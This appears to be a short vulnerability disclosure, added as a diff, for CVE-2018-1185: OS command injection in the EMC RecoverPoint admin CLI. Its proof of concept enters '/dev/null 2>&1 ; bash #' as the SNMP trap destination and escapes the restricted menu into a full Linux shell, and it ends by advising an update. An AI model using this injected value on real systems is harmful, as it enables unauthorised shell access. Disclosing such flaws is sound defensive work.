@@ -1,0 +1,27 @@
+# Exploit Title: EMC RecoverPoint 4.3 - Admin CLI Command Injection
+# Version: RecoverPoint prior to 5.1.1 RecoverPoint for VMs prior to 5.0.1.3
+# Date: 2018-05-11
+# Exploit Author: Paul Taylor
+# Github: https://github.com/bao7uo
+# Tested on: RecoverPoint for VMs 4.3, RecoverPoint 4.4.SP1.P1
+# CVE: CVE-2018-1185
+ 
+1. Description
+
+An OS command injection vulnerability resulting in code execution as the built-in admin user. 
+
+A crafted entry can result in the ability to escape from the restricted admin user's menu driven CLI to a full Linux operating system shell in the context of the admin user. The attack vector is the trap destination (hostname/IP) parameter of the test_snmp function.
+ 
+2. Proof of Concept
+
+RecoverPoint> test_snmp
+Enter the trap destination (host name or IP)
+ > /dev/null 2>&1 ; bash #
+admin@RecoverPoint:/home/kos/cli$ exit
+exit
+Test completed successfully.
+RecoverPoint> 
+
+3. Solution:
+    
+Update to latest version of RecoverPoint
